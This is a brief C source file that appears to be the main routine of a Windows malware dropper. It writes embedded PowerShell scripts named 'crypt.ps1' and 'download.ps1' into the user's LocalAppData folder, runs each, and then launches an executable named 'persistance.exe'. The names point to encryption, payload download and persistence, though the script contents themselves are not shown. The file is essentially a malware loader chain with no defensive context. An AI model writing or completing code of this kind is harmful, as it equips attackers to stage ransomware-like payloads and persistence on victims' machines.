#include <stdio.h>
#include <stdlib.h>
#include "helpers.h"
#include "script_constants/script_constants.h"


int main() {
    const size_t buffer_len = 300;
    char *local_app_data_path = getenv("LOCALAPPDATA");
    int return_val;

    char crypt_script_path[buffer_len];
    snprintf(crypt_script_path, buffer_len, "%s\\crypt.ps1", local_app_data_path);
    write_string(crypt_script_path, crypt_script);
    return_val = run_powershell_script(crypt_script_path);
    if (return_val != 0) {
        return return_val;
    }

    char download_script_path[buffer_len];
    snprintf(download_script_path, buffer_len, "%s\\download.ps1", local_app_data_path);
    write_string(download_script_path, download_script);
    return_val = run_powershell_script(download_script_path);
    if (return_val != 0) {
        return return_val;
    }
    
    char samplePath[buffer_len];
    snprintf(samplePath, buffer_len, "%s\\persistance.exe", local_app_data_path);
    return run_command(samplePath);
}